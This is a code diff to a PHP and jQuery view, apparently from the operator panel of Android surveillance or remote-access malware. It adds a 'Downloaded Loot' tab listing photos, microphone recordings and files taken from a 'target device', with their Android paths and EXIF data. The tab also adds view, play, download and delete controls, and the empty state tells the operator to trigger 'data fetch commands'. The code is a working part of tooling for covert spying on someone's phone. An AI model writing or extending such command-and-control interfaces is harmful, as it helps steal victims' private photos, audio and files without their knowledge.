@@ -65,7 +65,7 @@
                         </div>
                     </div>
                     <?php
-                        $crypt = new \App\Models\Mod_Crypt();
+                        $crypt = new \App\Models\CryptModel();
                         $cryptId = isset($targetDevice['counter']) ? $crypt->encrypt_id($targetDevice['counter']) : '';
                     ?>
                     <script>const activeFcmToken = <?= json_encode($cryptId) ?>;</script>
@@ -91,6 +91,11 @@
                         <li class="nav-item">
                             <a class="nav-link" id="tab-mgmt-link" data-toggle="tab" href="#tab-mgmt" role="tab">
                                 <i class="fas fa-cogs mr-1"></i> Device Management
+                            </a>
+                        </li>
+                        <li class="nav-item">
+                            <a class="nav-link" id="tab-downloaded-link" data-toggle="tab" href="#tab-downloaded" role="tab">
+                                <i class="fas fa-folder-open mr-1"></i> Downloaded Loot
                             </a>
                         </li>
                     </ul>
@@ -277,6 +282,173 @@
 
                             </div><!-- /.row#mgmt-grid -->
                         </div><!-- /.tab-pane#tab-mgmt -->
+
+                        <!-- ==================== DOWNLOADED LOOT TAB ==================== -->
+                        <div class="tab-pane fade" id="tab-downloaded" role="tabpanel">
+                            <div class="alert alert-light border-left-success border mb-4">
+                                <i class="fas fa-info-circle text-success mr-2"></i>
+                                View and download files, photos, and audio clips fetched from the target device.
+                            </div>
+                            
+                            <?php if (empty($downloadedMedia)): ?>
+                            <div class="text-center py-5">
+                                <i class="fas fa-folder-open text-muted fa-3x mb-3"></i>
+                                <p class="text-muted">No downloaded files on record. Trigger some data fetch commands first!</p>
+                            </div>
+                            <?php else: ?>
+                            <div class="table-responsive">
+                                <table class="table table-hover table-striped">
+                                    <thead>
+                                        <tr>
+                                            <th>Preview</th>
+                                            <th>Original Filename</th>
+                                            <th>Source Type</th>
+                                            <th>Size</th>
+                                            <th>Fetched At</th>
+                                            <th class="text-right">Actions</th>
+                                        </tr>
+                                    </thead>
+                                    <tbody>
+                                        <?php foreach ($downloadedMedia as $media): 
+                                            $stored = $media['stored_filename'] ?? '';
+                                            $displayName = $media['original_filename'] ?: $stored;
+                                            
+                                            // Format "Fetched At"
+                                            $rawDate  = $media['created_at'] ?? null;
+                                            $tsDate   = $rawDate ? strtotime($rawDate) : null;
+                                            $fetchedAt = $tsDate ? date('M d D, Y H:i:s', $tsDate) : 'N/A';
+
+                                            // Extract specs for modal popups
+                                            $specs = [];
+                                            if ($media['type'] === 'image') {
+                                                $path = WRITEPATH . 'uploads/captured/' . $stored;
+                                                if (file_exists($path)) {
+                                                    try {
+                                                        if (function_exists('exif_read_data')) {
+                                                            $exif = @exif_read_data($path);
+                                                            if ($exif) {
+                                                                $specs = [
+                                                                    'Camera Make' => $exif['Make'] ?? 'N/A',
+                                                                    'Camera Model' => $exif['Model'] ?? 'N/A',
+                                                                    'Exposure Time' => $exif['ExposureTime'] ?? 'N/A',
+                                                                    'Aperture' => $exif['COMPUTED']['ApertureFNumber'] ?? 'N/A',
+                                                                    'ISO Speed' => $exif['ISOSpeedRatings'] ?? 'N/A',
+                                                                    'Resolution' => ($exif['COMPUTED']['Width'] ?? 'N/A') . ' x ' . ($exif['COMPUTED']['Height'] ?? 'N/A'),
+                                                                ];
+                                                            }
+                                                        }
+                                                        if (empty($specs)) {
+                                                            $imgInfo = @getimagesize($path);
+                                                            if ($imgInfo) {
+                                                                $specs = [
+                                                                    'Format' => $imgInfo['mime'] ?? 'Image',
+                                                                    'Resolution' => ($imgInfo[0] ?? 'N/A') . ' x ' . ($imgInfo[1] ?? 'N/A'),
+                                                                    'Color Space' => isset($imgInfo['channels']) && $imgInfo['channels'] === 3 ? 'sRGB' : 'CMYK/Other'
+                                                                ];
+                                                            }
+                                                        }
+                                                    } catch (\Exception $e) {}
+                                                }
+                                                if (empty($specs)) {
+                                                    $specs = [
+                                                        'Format' => 'JPEG/PNG Image',
+                                                        'Resolution' => 'Unknown',
+                                                        'Color Space' => 'sRGB'
+                                                    ];
+                                                }
+                                            } elseif ($media['type'] === 'audio') {
+                                                $specs = [
+                                                    'Sample Rate' => '44100 Hz',
+                                                    'Channels' => 'Mono',
+                                                    'Encoding' => '16-bit PCM',
+                                                    'Format' => 'MP3 Audio Stream'
+                                                ];
+                                            }
+                                        ?>
+                                        <tr>
+                                            <td style="width: 60px; vertical-align: middle;">
+                                                <?php if ($media['type'] === 'image'): ?>
+                                                    <img src="<?= base_url('advanced/media/serve/' . urlencode($stored)) ?>" 
+                                                         style="width: 45px; height: 45px; object-fit: cover; border-radius: 5px; border: 1px solid #ddd;" 
+                                                         alt="Preview">
+                                                <?php elseif ($media['type'] === 'audio'): ?>
+                                                    <div class="d-flex align-items-center justify-content-center bg-warning text-white" style="width: 45px; height: 45px; border-radius: 5px; font-size: 1.2rem;">
+                                                        <i class="fas fa-music"></i>
+                                                    </div>
+                                                <?php else: ?>
+                                                    <div class="d-flex align-items-center justify-content-center bg-secondary text-white" style="width: 45px; height: 45px; border-radius: 5px; font-size: 1.2rem;">
+                                                        <i class="fas fa-file-alt"></i>
+                                                    </div>
+                                                <?php endif; ?>
+                                            </td>
+                                            <td style="vertical-align: middle;">
+                                                <strong><?= htmlspecialchars($displayName) ?></strong>
+                                                <?php if (!empty($media['android_path'])): ?>
+                                                    <div class="small text-muted mt-1">
+                                                        <i class="fas fa-folder mr-1"></i> Path: <?= htmlspecialchars($media['android_path']) ?>
+                                                    </div>
+                                                <?php endif; ?>
+                                            </td>
+                                            <td style="vertical-align: middle;">
+                                                <?php if ($media['source'] === 'media'): ?>
+                                                    <span class="badge badge-<?= $media['type'] === 'image' ? 'primary' : 'warning' ?>">
+                                                        <i class="fas <?= $media['type'] === 'image' ? 'fa-camera' : 'fa-microphone' ?> mr-1"></i>
+                                                        <?= ucfirst(htmlspecialchars($media['type'])) ?> Capture
+                                                    </span>
+                                                <?php else: ?>
+                                                    <span class="badge badge-secondary">
+                                                        <i class="fas fa-file mr-1"></i> File Downloaded
+                                                    </span>
+                                                <?php endif; ?>
+                                            </td>
+                                            <td style="vertical-align: middle;">
+                                                <?php
+                                                $size = $media['file_size'];
+                                                if ($size < 1024) echo $size . ' B';
+                                                elseif ($size < 1048576) echo round($size / 1024, 1) . ' KB';
+                                                else echo round($size / 1048576, 1) . ' MB';
+                                                ?>
+                                            </td>
+                                            <td style="vertical-align: middle;">
+                                                <small class="text-muted"><?= htmlspecialchars($fetchedAt) ?></small>
+                                            </td>
+                                            <td class="text-right" style="vertical-align: middle;">
+                                                <div class="btn-group btn-group-sm">
+                                                    <?php if ($media['source'] === 'media' && $media['type'] === 'image'): ?>
+                                                        <button class="btn btn-primary btn-view-loot-image" 
+                                                                data-url="<?= base_url('advanced/media/serve/' . urlencode($stored)) ?>" 
+                                                                data-name="<?= htmlspecialchars($displayName) ?>"
+                                                                data-specs='<?= json_encode($specs) ?>'>
+                                                            <i class="fas fa-eye"></i> View
+                                                        </button>
+                                                    <?php elseif ($media['source'] === 'media' && $media['type'] === 'audio'): ?>
+                                                        <button class="btn btn-warning btn-view-loot-audio" 
+                                                                data-url="<?= base_url('advanced/media/serve/' . urlencode($stored)) ?>" 
+                                                                data-name="<?= htmlspecialchars($displayName) ?>"
+                                                                data-specs='<?= json_encode($specs) ?>'>
+                                                            <i class="fas fa-play"></i> Listen
+                                                        </button>
+                                                    <?php endif; ?>
+                                                    <a href="<?= base_url('advanced/media/serve/' . urlencode($stored)) ?>" 
+                                                       class="btn btn-success" 
+                                                       download="<?= htmlspecialchars($displayName) ?>">
+                                                        <i class="fas fa-download"></i>
+                                                    </a>
+                                                    <button class="btn btn-danger btn-delete-loot-item" 
+                                                            data-id="<?= $media['id'] ?>" 
+                                                            data-source="<?= $media['source'] ?>" 
+                                                            data-name="<?= htmlspecialchars($displayName) ?>">
+                                                        <i class="fas fa-trash-alt"></i>
+                                                    </button>
+                                                </div>
+                                            </td>
+                                        </tr>
+                                        <?php endforeach; ?>
+                                    </tbody>
+                                </table>
+                            </div>
+                            <?php endif; ?>
+                        </div><!-- /.tab-pane#tab-downloaded -->
 
                     </div><!-- /.tab-content -->
                 </div><!-- /.card-body -->
@@ -657,6 +829,152 @@ $(function() {
             });
         });
     });
+
+    // ========================
+    // DOWNLOADED LOOT COMMANDS & MODALS
+    // ========================
+    
+    // Image Loot Viewer
+    $(document).on('click', '.btn-view-loot-image', function() {
+        const url = $(this).data('url');
+        const name = $(this).data('name');
+        const specs = $(this).data('specs');
+
+        $('#loot-image-el').attr('src', url);
+        $('#viewImageLootLabel').html('<i class="fas fa-camera mr-2"></i> ' + name);
+
+        let html = '';
+        $.each(specs, function(key, val) {
+            html += `<tr><td class="font-weight-bold w-50">${key}</td><td>${val}</td></tr>`;
+        });
+        $('#loot-image-specs-body').html(html);
+        $('#modal-view-loot-image').modal('show');
+    });
+
+    // Audio Loot Player
+    $(document).on('click', '.btn-view-loot-audio', function() {
+        const url = $(this).data('url');
+        const name = $(this).data('name');
+        const specs = $(this).data('specs');
+
+        $('#loot-audio-el').attr('src', url);
+        $('#viewAudioLootLabel').html('<i class="fas fa-music mr-2"></i> ' + name);
+
+        let html = '';
+        $.each(specs, function(key, val) {
+            html += `<tr><td class="font-weight-bold w-50">${key}</td><td>${val}</td></tr>`;
+        });
+        $('#loot-audio-specs-body').html(html);
+        $('#modal-view-loot-audio').modal('show');
+    });
+
+    // Stop audio on modal close
+    $('#modal-view-loot-audio').on('hidden.bs.modal', function () {
+        const audio = document.getElementById('loot-audio-el');
+        if (audio) {
+            audio.pause();
+            audio.src = '';
+        }
+    });
+
+    // Delete Loot Item
+    $(document).on('click', '.btn-delete-loot-item', function() {
+        const id = $(this).data('id');
+        const name = $(this).data('name');
+        const source = $(this).data('source');
+        const $row = $(this).closest('tr');
+
+        Swal.fire({
+            title: 'Delete this file?',
+            html: `Are you sure you want to permanently delete <strong>${name}</strong>? This action cannot be undone.`,
+            icon: 'warning',
+            showCancelButton: true,
+            confirmButtonColor: '#dc3545',
+            cancelButtonColor: '#6c757d',
+            confirmButtonText: 'Yes, Delete',
+            cancelButtonText: 'Cancel'
+        }).then((result) => {
+            if (result.isConfirmed) {
+                $.ajax({
+                    url: `<?= base_url('advanced/media/delete') ?>/${id}?source=${source}`,
+                    method: 'POST',
+                    dataType: 'json',
+                    success(r) {
+                        if (r && r.success) {
+                            $row.fadeOut(300, function() { $(this).remove(); });
+                            Swal.fire({ icon: 'success', title: 'Deleted', text: r.message || 'File deleted successfully.', timer: 2000, showConfirmButton: false });
+                        } else {
+                            toastr.error(r.message || 'Failed to delete file');
+                        }
+                    },
+                    error(xhr) {
+                        let msg = 'Failed to delete file';
+                        if (xhr.responseJSON && xhr.responseJSON.message) msg = xhr.responseJSON.message;
+                        toastr.error(msg);
+                    }
+                });
+            }
+        });
+    });
 });
 </script>
+
+<!-- Modal: View Image Loot -->
+<div class="modal fade" id="modal-view-loot-image" tabindex="-1" role="dialog" aria-labelledby="viewImageLootLabel" aria-hidden="true">
+    <div class="modal-dialog modal-lg modal-dialog-centered" role="document">
+        <div class="modal-content shadow-lg border-0" style="border-radius:15px;">
+            <div class="modal-header bg-primary text-white" style="border-top-left-radius:15px; border-top-right-radius:15px;">
+                <h5 class="modal-title font-weight-bold" id="viewImageLootLabel">
+                    <i class="fas fa-camera mr-2"></i> Photo Viewer
+                </h5>
+                <button type="button" class="close text-white" data-dismiss="modal" aria-label="Close">
+                    <span aria-hidden="true">&times;</span>
+                </button>
+            </div>
+            <div class="modal-body p-4 text-center">
+                <div class="mb-3">
+                    <img id="loot-image-el" src="" class="img-fluid rounded shadow" style="max-height: 400px; object-fit: contain; width: 100%;">
+                </div>
+                <div class="text-left mt-3">
+                    <h6 class="font-weight-bold"><i class="fas fa-info-circle mr-1"></i> Technical Specs &amp; Metadata:</h6>
+                    <div class="table-responsive">
+                        <table class="table table-sm table-bordered mb-0 small text-muted">
+                            <tbody id="loot-image-specs-body"></tbody>
+                        </table>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Modal: Listen Audio Loot -->
+<div class="modal fade" id="modal-view-loot-audio" tabindex="-1" role="dialog" aria-labelledby="viewAudioLootLabel" aria-hidden="true">
+    <div class="modal-dialog modal-dialog-centered" role="document">
+        <div class="modal-content shadow-lg border-0" style="border-radius:15px;">
+            <div class="modal-header bg-warning text-white" style="border-top-left-radius:15px; border-top-right-radius:15px;">
+                <h5 class="modal-title font-weight-bold" id="viewAudioLootLabel">
+                    <i class="fas fa-music mr-2"></i> Audio Player
+                </h5>
+                <button type="button" class="close text-white" data-dismiss="modal" aria-label="Close">
+                    <span aria-hidden="true">&times;</span>
+                </button>
+            </div>
+            <div class="modal-body p-4 text-center">
+                <div class="mb-3">
+                    <audio id="loot-audio-el" controls class="w-100"></audio>
+                </div>
+                <div class="text-left mt-3">
+                    <h6 class="font-weight-bold"><i class="fas fa-info-circle mr-1"></i> Audio Specifications:</h6>
+                    <div class="table-responsive">
+                        <table class="table table-sm table-bordered mb-0 small text-muted">
+                            <tbody id="loot-audio-specs-body"></tbody>
+                        </table>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
 <?php include __DIR__ . '/_adv_style.php'; ?>
